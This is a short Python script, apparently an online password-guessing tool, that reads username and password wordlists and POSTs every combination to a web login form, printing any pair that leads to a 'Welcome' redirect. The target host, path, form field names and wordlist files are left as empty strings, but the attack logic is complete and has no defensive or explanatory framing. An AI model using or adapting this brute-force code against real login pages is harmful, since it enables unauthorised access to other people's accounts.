
import http.client, urllib.parse

username_file = open('')
password_file = open('')

user_list = username_file.readlines()
pwd_list = password_file.readlines()

for user in user_list:
    user = user.rstrip()
    for pwd in pwd_list:
        pwd = pwd.rstrip()


        print (user,"-",pwd)
        
        post_parameters = urllib.parse.urlencode({' ': user, ' ': pwd,' ': "Submit"})
        headers = {"Content-type": " ","Accept": "text/html"} # application/xhtml+xml 
        conn = http.client.HTTPConnection("",80)
        conn.request("POST", "", post_parameters, headers)
        response = conn.getresponse()

        if(response.getheader('location') == "Welcome"):
            print(" Success!!! ",user," - ",pwd)

